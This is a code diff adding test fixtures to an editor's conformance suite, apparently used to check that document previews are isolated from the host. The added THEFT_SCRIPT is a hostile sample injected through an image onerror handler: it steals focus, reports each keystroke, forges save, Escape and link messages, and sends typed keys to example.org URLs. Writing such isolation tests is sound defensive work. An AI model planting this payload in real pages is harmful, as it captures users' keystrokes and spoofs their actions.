@@ -46,3 +46,17 @@ export const NEWER_TEXT = '{{nyml\nkind: document\nformat: 2\ntitle: From a newe
 
 /** A long text the preview-isolation check types into (its end is far below the fold). */
 export const LONG_TEXT = `{{nyml\nkind: document\ntitle: Preview isolation\nuid: doc-conformance3p4q5r\n}}\n\n# Preview isolation\n\n${Array.from({ length: 160 }, (_, i) => `Paragraph ${i + 1} of a long document.\n`).join('\n')}`;
+
+/**
+ * A document script that steals the focus (ES5; no double quote, so it fits an HTML attribute): it
+ * puts an input in the preview and focuses it every 40 ms, posts a heartbeat
+ * (`orz-conformance-theft`) so the harness knows it runs, and on every key it receives reports it
+ * (`orz-conformance-stolen`) and forges the preview's own messages — a save key, Escape, "active",
+ * a link — and a popup, all inside the user activation that key gives the frame.
+ */
+export const THEFT_SCRIPT = "(function(){if(window.__orzTheft)return;window.__orzTheft=1;var P=parent,i=document.createElement('input');i.setAttribute('aria-label','theft');(document.body||document.documentElement).appendChild(i);"
+  + "document.addEventListener('keydown',function(e){P.postMessage({type:'orz-conformance-stolen',key:e.key},'*');P.postMessage({type:'orz-preview-active'},'*');P.postMessage({type:'orz-preview-key',key:'s'},'*');P.postMessage({type:'orz-preview-key',key:'Escape'},'*');P.postMessage({type:'orz-preview-link',href:'https://example.org/stolen-'+e.key},'*');try{window.open('https://example.org/stolen-popup')}catch(x){}},true);"
+  + "setInterval(function(){P.postMessage({type:'orz-conformance-theft'},'*');if(document.activeElement!==i)i.focus()},40)})()";
+
+/** A document whose preview runs {@link THEFT_SCRIPT} (from an image error handler, as a document script would). */
+export const THEFT_TEXT = `{{nyml\nkind: document\ntitle: Focus theft\nuid: doc-conformance7t8u9v\n}}\n\n# Focus theft\n\nA picture <img src="x-missing.png" alt="" onerror="${THEFT_SCRIPT}">\n\n${Array.from({ length: 40 }, (_, i) => `Line ${i + 1} of the text the reader edits.\n`).join('\n')}`;
